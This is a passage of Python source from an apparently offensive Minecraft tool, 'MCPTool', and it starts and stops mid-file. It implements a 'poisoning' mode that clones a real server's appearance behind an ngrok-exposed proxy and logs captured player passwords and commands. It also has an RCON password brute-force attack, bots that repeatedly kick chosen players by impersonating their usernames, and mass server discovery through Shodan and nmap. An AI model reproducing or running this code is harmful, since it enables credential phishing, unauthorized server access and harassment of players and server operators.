    if server_display_mode == '0' or forced_mode:
        check = check_domain(ip)

        if check:
            ip = socket.gethostbyname(ip)
            print(f'\n     {red}[{lred}I{lwhite}P{red}] {lwhite}{ip}:25565 {lred}(May be incorrect)')

        else:
            print(f'\n     {red}[{lred}I{lwhite}P{red}] {lwhite}{ip}')

        print(f'     {red}[{lred}MO{lwhite}TD{red}] {lwhite}{motd}')
        print(f'     {red}[{lred}Ver{lwhite}sion{red}] {lwhite}{version}')
        print(f'     {red}[{lred}Proto{lwhite}col{red}] {lwhite}{protocol}')
        print(f'     {red}[{lred}Play{lwhite}ers{red}] {lwhite}{connected_players}{lblack}/{lwhite}{player_limit}')

        if players is not None:
            players = replace_color_characters(players)
            print(f'     {red}[{lred}Nam{lwhite}es{red}] {lwhite}{players}')

    elif server_display_mode == '1':
        print(f'\n     {red}({lred}{ip}{red})({lgreen}{connected_players}{lblack}/{lgreen}{player_limit}{red})({lcyan}{version} {protocol}{red})({reset}{motd}{red})', end='')

    else:
        print(f'\n   {lwhite}[{lred}#{lwhite}] {lred}Invalid configuration! {lwhite}-> "server_display_mode": "{lred}{server_display_mode}{lwhite}"\n    >  {lwhite}Valid modes: {lgreen}0 {lwhite}- {lgreen}1{reset}')
        main()

    if connect_bot == 'y':
        username = get_name()
        output, clean_output = send_bot(ip, protocol, username, proxy)

        if server_display_mode == '0':
            print(f'     {red}[{lred}Chec{lwhite}ker{red}] {reset}{output}')

        elif server_display_mode == '1':
            print(f'({reset}{output}{red})', end='')

    return clean_output


def save_server(ip, motd, version, protocol, connected_players, player_limit, players, output_checker):
    """
    Save server data
    """

    if server_display_mode == '0':
        with open(logs_file, 'a', encoding='utf8') as f:
            f.write(f'\n[IP] {ip}')
            f.write(f'\n[MOTD] {motd}')
            f.write(f'\n[Version] {version}')
            f.write(f'\n[Protocol] {protocol}')
            f.write(f'\n[Players] {connected_players}/{player_limit}')

            if players is not None:
                f.write(f'\n[Names] {players}')

            if output_checker is not None:
                output_checker = output_checker.replace('\n', '')
                f.write(f'\n[Checker] {output_checker}\n')

            else:
                f.write('\n')

    elif server_display_mode == '1':
        with open(logs_file, 'a', encoding='utf8') as f:
            f.write(f'\n({ip})({connected_players}/{player_limit})({version} {protocol})({motd})')

            if output_checker is not None:
                f.write(f'({output_checker})\n')


def set_proxy(proxy):
    """
    Configure the proxy to be used
    """

    if proxy == 'random':
        print(f'\n    {red}[{lred}PRO{lwhite}XY{red}] {lwhite}Searching for a valid proxy server..')
        proxy = get_proxy()

        if proxy is not None:
            print(f'\n    {red}[{lred}PRO{lwhite}XY{red}] {lwhite}A valid proxy server was found! ({lgreen}{proxy}{lwhite})')
            time.sleep(1)
            return proxy

        print(f'\n    {red}[{lred}PRO{lwhite}XY{red}] {lwhite}A proxy server could not be found. Please try again in a few minutes or enter a proxy server manually.')
        return False

    try:
        check = check_ip_port(proxy)

        if check:
            check = check_proxy(proxy)

            if check:
                return proxy

        return False

    except IndexError:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid proxy.')
        return False


def save_logs(ip, location, command, message):
    """ 
    Create the files where the information returned by the commands will be saved.
    """

    date = datetime.now()
    file = f'{location}_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt'
    f = open(file, 'w+', encoding='utf8')

    if ip is not None:
        f.write(f'[>] MCPTool - By @wrrulos\n\n# Log information\n\n • Command: {command}\n • Date and time: {str(date.year)}-{str(date.month)}-{str(date.day)} {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n • Target: {ip}\n\n{message}\n')

    else:
        f.write(f'[>] MCPTool - By @wrrulos\n\n# Log information\n\n • Date and time: {str(date.year)}-{str(date.month)}-{str(date.day)} {str(date.hour)}.{str(date.minute)}.{str(date.second)}\n\n{message}\n')

    f.close()
    return file


def write_file(file, mode, encoding_mode, text, clean):
    """
    Write the file with the specified text. (Also cleans it if necessary)
    """

    if encoding_mode is not None:
        f = open(file, mode, encoding=encoding_mode)

    else:
        f = open(file, mode)

    if clean:
        f.truncate(0)

    f.write(text)
    f.close()


def get_text(file):
    """
    Returns the text of the specified file
    """

    f = open(file)
    content = f.read()
    f.close()
    return content


def send_bot(ip, protocol, name, proxy):
    """
    It sends a bot to the server to check if it can be entered and then disconnects it.
    """

    global scan_stopped

    output = ''
    ip = ip.split(':')

    try:
        if proxy is not None:
            proxy = proxy.split(':')
            process = subprocess.Popen(f'{node_command} settings/scripts/Checker.js {ip[0]} {ip[1]} {name} {protocol} {proxy[0]} {proxy[1]}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        else:
            process = subprocess.Popen(f'{node_command} settings/scripts/Checker.js {ip[0]} {ip[1]} {name} {protocol}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        try:
            output = process.communicate()[0].decode('utf-8')

        except UnicodeDecodeError:
            output = process.communicate()[0].decode('unicode_escape')

        clean_output = remove_json_characters(output)  # This output will be saved in the text files (the logs)
        clean_output = remove_color_characters(clean_output)
        output = remove_json_characters(output)
        output = replace_color_characters(output)
        output = str(output)
        return output, clean_output

    except KeyboardInterrupt:
        main()


def start_proxy_server(target, proxy_port, location, ngrok):
    """
    Start a proxy connection to the specified server
    """

    global check_proxy_update

    old_content = ''
    ngrok_ip = False

    if check_proxy_update:
        connection = check_connection()

        if connection:
            check_proxy_version()
            check_proxy_update = False

        else:
            print(f'\n    {red}[{lred}UPD{lwhite}ATE{red}] {lwhite}Could not check for updates. Check your internet connection.')

    try:
        print(f'\n    {red}[{lred}PRO{lwhite}XY{red}] {lwhite}Preparing the proxy server..')
        time.sleep(1)

        print(f'\n    {red}[{lred}PRO{lwhite}XY{red}] {lwhite}Configuring the server..')
        time.sleep(1)

        settings = get_text('settings/files/proxy_settings')  # Open default settings
        settings = settings.replace('[[PORT]]', proxy_port).replace('[[ADDRESS]]', target)
        write_file(f'settings/proxy_servers/{location}/config.yml', 'w+', 'utf8', settings, True)

        if ngrok:  # If 'Ngrok' is True it means that the 'poisoning' command is being executed
            print(f'\n    {red}[{lred}PRO{lwhite}XY{red}] {lwhite}Copying the data from the specified server..')
            time.sleep(1)

            check_folder('logs', 'logs/poisoning', 'settings/proxy_servers/poisoning/plugins/RPoisoner')
            logs_file = save_logs(target, 'logs/poisoning/Poisoning', 'poisoning', '[•] Captured passwords:\n')

            online_players, max_players, motd, image = get_data_from_server_mcsrvstatus(target)

            if online_players is None and max_players is None:
                return

            os.remove('settings/proxy_servers/poisoning/plugins/CleanMOTD/config.yml')
            os.remove('settings/proxy_servers/poisoning/server-icon.png')

            try:
                _ = motd[0]
                _ = motd[1]
                long_motd = True  # If the motd has two lines

            except IndexError:
                long_motd = False  # If the motd has only one line

            settings = get_text('settings/files/cleanmotd_settings')  # Save the default configuration of the CleanMOTD plugin
            settings = settings.replace('[[MAX_PLAYERS]]', str(max_players)).replace('[[AMOUNT]]', str(online_players))  # Replace the variables with the data from the server

            if long_motd:
                settings = f'{settings}\n        {motd[0]}\n        {motd[1]}'

            else:
                settings = f'{settings}\n        {motd[0]}'

            write_file('settings/proxy_servers/poisoning/plugins/CleanMOTD/config.yml', 'w+', 'utf8', settings, True)  # Save the new CleanMOTD configuration

            if image is not None:  # Save the image from the server
                write_file('settings/proxy_servers/poisoning/server-icon.png', 'wb', None, image, True)

            else:  # If the specified server has no image: Use the default image of a Minecraft server
                shutil.copy('settings/files/server-icon.png', 'settings/proxy_servers/poisoning/server-icon.png')

            if os.path.isfile('settings/proxy_servers/poisoning/plugins/RPoisoner/commands.txt'):  # Check if the RPoisoner plugin 'commands.txt' file exists (If it exists delete the previous content)
                f = open('settings/proxy_servers/poisoning/plugins/RPoisoner/commands.txt', 'w+', encoding='utf8')
                f.truncate(0)
                f.close()

            else:
                f = open('settings/proxy_servers/poisoning/plugins/RPoisoner/commands.txt', 'w')
                f.close()

            ngrok = subprocess.Popen(f'{ngrok_command} {proxy_port}', stdout=subprocess.PIPE, shell=True)

            print(f'\n    {red}[{lred}NGR{lwhite}OK{red}] {lwhite}Starting ngrok server..')
            time.sleep(1)

            ngrok_ip = ngrok_data()

            if ngrok_ip is False:
                print(f'\n    {red}[{lred}NGR{lwhite}OK{red}] {lwhite}Could not get ngrok ip address')
                return

        print(f'\n    {red}[{lred}PRO{lwhite}XY{red}] {lwhite}Starting proxy..')
        proxy = subprocess.Popen(f'cd settings/proxy_servers/{location} && {proxy_command}', stdout=subprocess.PIPE, shell=True)

        time.sleep(1)
        print(f'\n\n    {red}[{lred}IN{lwhite}FO{red}] {lwhite}Proxy server details:\n\n    {red}[{lred}I{lwhite}P{red}] {lwhite}127.0.0.1:{proxy_port}')
        time.sleep(1)

        if ngrok:
            print(f'\n    {red}[{lred}I{lwhite}P{red}] {lwhite}{ngrok_ip}\n\n    {red}[{lwhite}#{red}] {lwhite}Waiting for commands..\n')

    except KeyboardInterrupt:
        print(f'\n    {red}[{lred}CTRL{lwhite}-C{red}] {lwhite}Stopping..')
        return

    while True:
        try:
            time.sleep(1)

            if ngrok:
                commands_file = open('settings/proxy_servers/poisoning/plugins/RPoisoner/commands.txt', 'r+', encoding='unicode_escape')
                content = commands_file.readlines()

                if content == old_content:
                    continue

                old_content = content

                for line in content:
                    print(f'    {red}[{lgreen}!{red}] {lwhite}Command captured {line}')
                    with open(logs_file, 'a') as f:
                        f.write(f'Player {line}')

        except KeyboardInterrupt:
            print(f'\n    {red}[{lred}CTRL{lwhite}-C{red}] {lwhite}Stopping..')

            if ngrok:
                ngrok.kill()

            proxy.kill()
            break

    
def kick_player(target, username, protocol, proxy, mode, message1, message2):
    """
    Send a bot to kick the player from the server.
    """

    check = check_ip_port(target)

    if not check:
        return

    target = target.split(':')
    check = check_server(f'{target[0]}:{target[1]}')

    if not check:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The connection to the server could not be established. Enter a valid server!')
        return

    if mode == 'kick' or mode == 'block':
        print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lwhite}Sending to the bot..')

    else:
        print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lwhite}Preparing the attack... ({lred}{mode}{lwhite})')
        time.sleep(0.8)

        print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lwhite}Starting the attack on {lgreen}{target[0]}:{target[1]}')
        time.sleep(0.8)

    if mode == 'kick':
        output, clean_output = send_bot(f'{target[0]}:{target[1]}', protocol, username, proxy)
        clean_output = clean_output.replace('\n', '')

        if 'Connected' == clean_output:
            print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lgreen}The player {username} was kicked.')

        else:
            print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lwhite}The player {username} could not be kicked. Reason: {output}')

    elif mode == 'kickall':
        players = get_players(f'{target[0]}:{target[1]}')

        if players[0] is not False:
            for player in players:
                output, clean_output = send_bot(f'{target[0]}:{target[1]}', protocol, player, proxy)
                clean_output = clean_output.replace('\n', '')

                if 'Connected' == clean_output:
                    print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lgreen}The player {player} was kicked.')

                else:
                    print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lwhite}The player {player} could not be kicked. Reason: {output}')
                
                time.sleep(2)

            print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lwhite}The attack is over.')

        elif players[1] == 'Timeout':
            print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid domain or IP address.')

        elif players[1] == 'Players':
            print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Could not get users from server.')

    elif mode == 'block':
        while True:
            try:
                output, clean_output = send_bot(f'{target[0]}:{target[1]}', protocol, username, proxy)
                clean_output = clean_output.replace('\n', '')

                if 'Connected' == clean_output:
                    print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lgreen}The player {username} was kicked.')

                else:
                    print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lwhite}The player {username} could not be kicked. Reason: {output}')
                
                time.sleep(3)

            except KeyboardInterrupt:
                print(f'\n    {red}[{lred}{message1}{lwhite}{message2}{red}] {lwhite}Stopping the attack..')
                time.sleep(0.5)
                break


def update_proxy(download_link):
    """
    Update proxys servers
    """

    print(f'\n    {red}[{lred}DOWN{lwhite}LOAD{red}] {lgreen}Downloading the latest version of the proxy. ({lcyan}WaterFall.Jar{lgreen})')
    check_folder('mcptool_temp')

    with open('mcptool_temp/WaterFall.jar', 'wb') as file:
        proxy = requests.get(download_link)
        file.write(proxy.content)

    print(f'\n    {red}[{lred}DOWN{lwhite}LOAD{red}] {lgreen}Updating proxy servers..')

    os.remove('settings/proxy_servers/poisoning/WaterFall.jar')
    os.remove('settings/proxy_servers/bungee/WaterFall.jar')
    shutil.copy('mcptool_temp/WaterFall.jar', 'settings/proxy_servers/poisoning/WaterFall.jar')
    shutil.copy('mcptool_temp/WaterFall.jar', 'settings/proxy_servers/bungee/WaterFall.jar')
    os.remove('mcptool_temp/WaterFall.jar')
    os.rmdir('mcptool_temp')

    f = open('settings/settings.json', 'r')
    content = f.read()
    f.close()

    js = json.loads(content)
    js['proxy_version'] = download_link

    with open('settings/settings.json', 'w') as f:
        json.dump(js, f, indent=4)

    print(f'\n    {red}[{lred}DOWN{lwhite}LOAD{red}] {lgreen}The update is finished!')


def ngrok_data():
    """
    Returns the IP address of the ngrok tunnel
    """

    try:
        r = requests.get('http://localhost:4040/api/tunnels')
        r_unicode = r.content.decode('utf-8')
        r_json = json.loads(r_unicode)

        domain = r_json['tunnels'][0]['public_url']
        domain = domain.replace('tcp://', '')
        domain = domain.split(':')
        ip = socket.gethostbyname(str(domain[0]))
        ip = f'{ip}:{domain[1]}'
        return ip

    except (requests.exceptions.ConnectionError, requests.exceptions.JSONDecodeError):
        return False

# ------------ Commands ------------

def server_command(server):
    """
    Gets the information from the specified server and then displays it on the screen.
    """

    old_server = server
    check = check_domain(server)  # Check if the entered server is a domain

    if check:  # If the entered server is a domain:
        check = get_ip_port(server) 

        if not check:  # If the API did not give a response on the server:
            pass

        else:
            server = check

    motd, _, version, _, protocol, connected_players, player_limit, players = get_data_from_server(server)

    if not motd:  # If a response from the server could not be obtained:
        if check:
            motd, _, version, _, protocol, connected_players, player_limit, players = get_data_from_server(old_server)

            if not motd:
                print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The entered server does not exist or is down!')
                return
        
        else:
            print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The entered server does not exist or is down!')
            return

    show_server(server, motd, version, protocol, connected_players, player_limit, players, None, None, True)


def player_command(username):
    """
    Gets the information from the specified player
    """

    online_uuid, offline_uuid = get_player(username)

    if online_uuid is not None:
        print(f'\n    {red}[{lred}UU{lwhite}ID{red}] {lwhite}Online UUID: {online_uuid}\n    {red}[{lred}UU{lwhite}ID{red}] {lwhite}Offline UUID: {offline_uuid}')

    else:
        print(f'\n    {red}[{lred}UU{lwhite}ID{red}] {lwhite}Offline UUID: {offline_uuid}')


def ipinfo_command(ip_address):
    """
    Get information about an IP address
    """

    try:
        socket.inet_pton(socket.AF_INET, ip_address)  # Check the IP address

        r = requests.get(f'http://ip-api.com/json/{ip_address}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,timezone,isp,org,as,asname,reverse,query')
        r_json = r.json()

        if r_json['status'] == 'success':
            continent = r_json['continent']
            continentCode = r_json['continentCode']
            country = r_json['country']
            countryCode = r_json['countryCode']
            region = r_json['region']
            regionName = r_json['regionName']
            city = r_json['city']
            timezone = r_json['timezone']
            isp = r_json['isp']
            org = r_json['org']
            as_ = r_json['as']
            asname = r_json['asname']
            reverse = r_json['reverse']

            print(f'\n    {red}[{lred}Conti{white}nent{red}] {white}{continent} ({lred}{continentCode}{white})')
            print(f'    {red}[{lred}Coun{white}try{red}] {white}{country} ({lred}{countryCode}{white})')
            print(f'    {red}[{lred}Reg{white}ion{red}] {white}{regionName} ({lred}{region}{white})')
            print(f'    {red}[{lred}Ci{white}ty{red}] {white}{city} ({lred}{timezone}{white})')
            print(f'    {red}[{lred}IS{white}P{red}] {white}{isp} ({lred}{org}{white})')
            print(f'    {red}[{lred}A{white}S{red}] {white}{asname} ({lred}{as_}{white})')

            if reverse != '':
                print(f'    {red}[{lred}Reve{white}rse{red}] {white}{reverse}')

        else:
            print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The IP address is not valid.')
                        
    except requests.exceptions.ConnectionError:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Could not connect to API.')

    except socket.error:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The IP address is not valid.')


def dnslookup_command(domain):
    """
    Get the dns records of the domain.
    """

    dns_records = ['A', 'AAAA', 'CAA', 'CNAME', 'MX', 'SRV', 'TXT', 'NS', 'SOA']
    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={domain}')
    content = r.text

    if 'error input invalid - enter IP or Hostname' in content:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid domain.')
        return

    date = datetime.now()
    dnslookup_file = f'DNSLookup_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt'

    f = open(dnslookup_file, 'w+', encoding='utf8')
    f.write(r.text)
    f.close()

    f = open(dnslookup_file, 'r+', encoding='utf8')
    content = f.readlines()
    f.close()
    os.remove(dnslookup_file)
    print('')

    for line in content:
        for record in dns_records:
            if 'AAAA : ' in line:
                line = line.replace(f'AAAA : ', f'{red}[{lred}AAAA{red}] {lwhite}')

            elif 'SOA : ' in line:
                line = line.replace(f'SOA : ', f'{red}[{lred}SOA{red}] {lwhite}')

            else:
                line = line.replace(f'{record} : ', f'{red}[{lred}{record}{red}] {lwhite}')

        print(f'    {line}', end='')

    print('')


def search_command(data):
    """
    Use the Shodan search engine to search for IP addresses that have port 25565 open and then
    check if they are from Minecraft, to finally show it on the screen.
    """

    global logs_file, servers_found

    try:
        server_list = []
        text = ' '.join(data)
        data = text[7:]  # Remove the 'search' from the variable
        data = data.split(' --- ')
        search = shodan.Shodan(shodan_token)

        for d in data:
            print(f'\n    {red}[{lred}SEA{lwhite}RCH{red}] {lwhite}Searching for servers containing the following data -> {lgreen}{d}{lwhite}')
            servers = search.search(d)  # Start the search with Shodan

            for server in servers['matches']:
                ip = str(server['ip_str'])
                port = str(server['port'])
                server_list.append(f'{ip}:{port}')

        if len(server_list) == 0:  # If no servers were found with that data:
            print(f'\n    {red}[{lred}SEA{lwhite}RCH{red}] {lwhite}No servers were found with the specified data')
            return

        check_folder('logs', 'logs/search')
        logs_file = save_logs(data, f'logs/search/Search', 'search', '[•] Servers Found:')
        data = ' '.join(data)

        for server in server_list:
            motd, clean_motd, version, clean_version, protocol, connected_players, player_limit, players = get_data_from_server(server)

            if not motd:
                continue

            show_server(server, motd, version, protocol, connected_players, player_limit, players, None, None, False)
            save_server(server, clean_motd, clean_version, protocol, connected_players, player_limit, players, None)
            servers_found += 1

        if server_display_mode == '1':  # Add the missing line break
            print('')

        if servers_found >= 1:
            print(f'\n    {red}[{lred}FINI{lwhite}SHED{red}] {lwhite}The search ended and found {servers_found} servers.')
        
        else:
            print(f'\n    {red}[{lred}FINI{lwhite}SHED{red}] {lred}TThe search ended and no servers were found.')

    except shodan.exception.APIError as e:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}{e}')

    except KeyboardInterrupt:
        if server_display_mode == '1':  # Add the missing line break
            print('')

        print(f'\n    {red}[{lred}CHE{lwhite}CKER{red}] {lwhite}Stopping the search..')


def scan_command(ip, ports, method, connect_bot, proxy, host):
    """
    Scan the ports of an IP address to find Minecraft servers.
    """

    global logs_file, servers_found, scan_stopped, first_node

    if scan_stopped:
        return

    check_folder('logs')
    date = datetime.now()
    print(f'\n    {red}[{lred}SC{lwhite}AN{red}] {lwhite}Scanning IP address {ip}..')

    try:
        if method == '0':  # Scan using Nmap
            scan_file = f'temp_scan_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt'  # Text file where the nmap logs will be saved
            subprocess.run(f'nmap -p {str(ports)} -T5 -Pn -v -oN {scan_file} {str(ip)} >nul 2>&1', shell=True)  # Run the Nmap command

        elif method == '1':  # Scan using quboscanner.
            scan_file = None

            check_folder('settings/qubo/outputs')
            file_list = os.listdir('settings/qubo/outputs')  # Save current quboscanner outputs to a list
            subprocess.run(f'cd settings/qubo && {qubo_command} -range {ip} -ports {ports} -th {qubo_threads} -ti {qubo_timeout} >nul 2>&1', shell=True)  # Run the quboscanner command
            new_file_list = os.listdir('settings/qubo/outputs')  # Save current quboscanner outputs back to another list

            for file in new_file_list:  # Here it compares if a new file was created. If it is created it is because the quboscanner scan was successful.
                if file in file_list:
                    pass

                else:
                    scan_file = f'settings/qubo/outputs/{file}'

            if scan_file is None:  # In case the file is not created:
                print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}There was an error trying to scan with quboscanner. Check the arguments.')
                return

    except KeyboardInterrupt:
        try:
            os.remove(scan_file)

        except FileNotFoundError:
            pass

        scan_stopped = True
        print(f'\n    {red}[{lred}SC{lwhite}AN{red}] {lwhite}Stopping the scan..')
        return

    if method != '1':
        error = check_scan_error(scan_file, ip)

        if error:
            try:
                os.remove(scan_file)

            except FileNotFoundError:
                pass

            return True

    if host is not None:  # Detect if this function is being called from 'host_command' function
        if first_node:  # This is to avoid creating a text file for each node'
            check_folder('logs/host')
            logs_file = save_logs(ip, f'logs/host/{host}', 'host', '[•] Servers Found:')
            first_node = False

    else:
        check_folder('logs/scans')
        logs_file = save_logs(ip, 'logs/scans/scan', 'scan', '[•] Servers Found:')

    check__encoding = check_encoding(scan_file)
    scan_date = datetime.now()
    scan_ip_list = f'temp_scan_ip_list_{str(scan_date.day)}-{str(scan_date.month)}-{str(scan_date.year)}_{str(scan_date.hour)}.{str(scan_date.minute)}.{str(scan_date.second)}.txt'
    scan_results = open(scan_ip_list, 'w+')

    with open(scan_file, encoding=check__encoding) as scan__result:  # Save all ip addresses in text file.
        if method == '0':  # Nmap
            for line in scan__result:  # It will search line by line for what matches: IP and {1-5}/tcp open. It will save it in a list in an ordered way
                ip = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)
                ip = ' '.join(ip)
                ip = ip.replace('(', '').replace(')', '')
                port = re.findall('\d{1,5}\/tcp open', line)
                port = ' '.join(port)

                if '.' in ip:
                    current_ip = ip

                if 'tcp' in port:
                    port = port.replace('/tcp open', '')
                    current_ip_backup = current_ip

                    try:
                        current_ip = current_ip.split(' ')
                        current_ip = current_ip[1]

                    except IndexError:
                        current_ip = current_ip_backup

                    scan_results.write(f'{current_ip}:{port}\n')

        elif method == '1':  # Qubo
            for line in scan__result:  # It will search line by line for what matches: IP:PORT
                ip = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}', line)
                ip = ' '.join(ip)

                if ':' in ip:
                    scan_results.write(f'{ip}\n')

    try:
        with open(scan_ip_list) as scan_results:
            for line in scan_results:
                line = line.replace('\n', '')
                motd, clean_motd, version, clean_version, protocol, connected_players, player_limit, players = get_data_from_server(line)  # Returns server data

                if not motd:
                    continue

                bot_output = show_server(line, motd, version, protocol, connected_players, player_limit, players, connect_bot, proxy, False) # Save server data
                save_server(line, clean_motd, clean_version, protocol, connected_players, player_limit, players, bot_output)
                servers_found += 1

    except KeyboardInterrupt:
        try:
            os.remove(scan_ip_list)
            os.remove(scan_file)

        except FileNotFoundError:
            pass

        if server_display_mode == '1':  # Add the missing line break
            print('')

        scan_stopped = True
        print(f'\n    {red}[{lred}SC{lwhite}AN{red}] {lwhite}Stopping the scan..')
        return False

    try:
        os.remove(scan_ip_list)
        os.remove(scan_file)

    except FileNotFoundError:
        pass

    if server_display_mode == '1':  # Add the missing line break
        print('')


def host_command(hostname, ports, method, connect_bot, proxy):
    """
    Scan the nodes of a hosting (The host and its nodes are extracted from settings.json)
    """

    global first_node
    
    try:
        first_node = True
        nodes = []
        num_nodes = 0

        host_nodes, domain = get_host_information(hostname)
        print(f'\n    {red}[{lred}SCAN{lwhite}NER{red}] {lwhite}Searching for available nodes..')

        for node in host_nodes:
            try:
                ip = socket.gethostbyname(f'{str(node)}{str(domain)}')
                num_nodes += 1
                nodes.append(ip)

            except (socket.gaierror, socket.timeout):
                pass

        if num_nodes == 0:
            print(f'\n\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}No active nodes were found.')
            return

        print(f'\n    {red}[{lred}NO{lwhite}DE{red}] {lwhite}Found nodes: {num_nodes}')
        time.sleep(1)

        for node in nodes:
            error = scan_command(node, ports, method[1], connect_bot, proxy, hostname)

            if error:
                break

        if not error:
            if servers_found >= 1:
                print(f'\n    {red}[{lred}FINI{lwhite}SHED{red}] {lwhite}The scan finished and found {servers_found} servers.')
            
            else:
                print(f'\n    {red}[{lred}FINI{lwhite}SHED{red}] {lred}The scan has finished and no servers were found.')

    except KeyboardInterrupt:
        return


def checker_command(file, connect_bot, proxy):
    """
    Get the servers from a txt file and check if they are online. (You can also send a bot)
    """

    global logs_file, servers_found

    ip_list = []
    num = 0
    
    try:
        check__encoding = check_encoding(file)

    except FileNotFoundError:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The file {file} was not found.')
        return

    with open(file, encoding=check__encoding) as f:
        for line in f:
            ip = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}', line)
            ip = ' '.join(ip)

            if ':' in ip:
                num += 1
                ip_list.append(ip)

    check_folder('logs', 'logs/checker')
    logs_file = save_logs(file, f'logs/checker/Checker', 'checker', '[•] Servers Found:')

    try:
        for ip in ip_list:
            motd, clean_motd, version, clean_version, protocol, connected_players, player_limit, players = get_data_from_server(ip)  # Returns server data

            if not motd:
                return

            bot_output = show_server(ip, motd, version, protocol, connected_players, player_limit, players, connect_bot, proxy, False) # Save server data
            save_server(ip, clean_motd, clean_version, protocol, connected_players, player_limit, players, bot_output)
            servers_found += 1

    except KeyboardInterrupt:
        print(f'\n    {red}[{lred}CHE{lwhite}CKER{red}] {lwhite}Stopping the checker..')
        return

    print(f'\n    {red}[{lred}FINI{lwhite}SHED{red}] {lwhite}The scan finished and found {servers_found} servers.')


def listening_command(server):
    """
    Save all players that enter the server.
    """

    player_list = []
    found = False

    try:
        srv = JavaServer.lookup(server)
        _ = srv.status()

    except (socket.gaierror, socket.timeout):
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid domain or IP address.')
        return

    print(f'\n    {red}[{lred}LISTE{lwhite}NING{red}] {lwhite}Waiting for the players..')

    while True:
        try:
            srv = JavaServer.lookup(server)
            response = srv.status()

            if response.players.sample is not None:
                for player in response.players.sample:
                    if player.name != '':
                        if not found:
                            print(f'\n    {red}[{lred}FOU{lwhite}ND{red}] {lwhite}Players found:\n')
                            found = True

                        if f'{player.name} ({player.id})' not in player_list:
                            player_found = f'{player.name} ({player.id})'
                            player_list.append(player_found)
                            player_found = f'{lred}{player.name} {lred}({lwhite}{player.id}{lred})'
                            print(f'     {lwhite}• {player_found}')

            time.sleep(1)

        except (socket.gaierror, socket.timeout):
            print(f'\n    {red}[{lred}TIME{lwhite}OUT{red}] {lwhite}The connection to the server could not be established. Trying again in 30 seconds..')
            time.sleep(30)
            
        except KeyboardInterrupt:
            print(f'\n    {red}[{lred}CTRL{lwhite}-C{red}] {lwhite}Stopping..')
            return


def rcon_command(target, file):
    """
    Perform a brute force attack via RCON
    """

    check = check_ip_port(target)

    if not check:
        return

    target = target.split(':')
    print(f'\n    {red}[{lred}RC{lwhite}ON{red}] {lwhite}Preparing the brute force attack towards {target[0]}:{target[1]}..')
    time.sleep(0.8)

    try:
        f = open(file, 'r', encoding='utf8')
        passwords = f.readlines()
        f.close()

    except FileNotFoundError:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The file {file} was not found.')
        return

    number_of_passwords = 0

    for _ in passwords:
        number_of_passwords += 1

    if number_of_passwords == 0:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The file is empty!')
        return

    if number_of_passwords > 1:
        text = 'passwords'

    else:
        text = 'password'

    print(f'\n    {red}[{lred}FI{lwhite}LE{red}] {lwhite}Selected file: {file} ({lgreen}{number_of_passwords} {text}{lwhite})')
    time.sleep(0.8)

    print(f'\n    {red}[{lred}RC{lwhite}ON{red}] {lwhite}Starting the attack..')
    password_found = False
    attack_finished = False
    time.sleep(2)

    while True:
        try:
            time.sleep(0.5)

            if attack_finished:
                if password_found:
                    pass

                else:
                    subprocess.run('cls || clear', shell=True)
                    print(f'{banner}\n\n    {red}[{lred}RC{lwhite}ON{red}] {lred}The attack ended and the password was not found.')

                break

            for password in passwords:
                password = password.replace('\n', '')
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}ATT{lwhite}ACK{red}] {lwhite}Testing the password: {password}')

                try:
                    with MCRcon(target[0], password, int(target[1]), timeout=35) as mcr:
                        check_folder('logs', 'logs/rcon')
                        save_logs(f'{target[0]}:{target[1]}', 'logs/rcon/RCON', 'rcon', f'RCON Password: {password}')
                        subprocess.run('cls || clear', shell=True)
                        print(f'{banner}\n\n    {red}[{lred}ATT{lwhite}ACK{red}] {lgreen}Password found! {lwhite}The password is: {lgreen}{password}')
                        mcr.disconnect()

                    password_found = True
                    break

                except TimeoutError:
                    subprocess.run('cls || clear', shell=True)
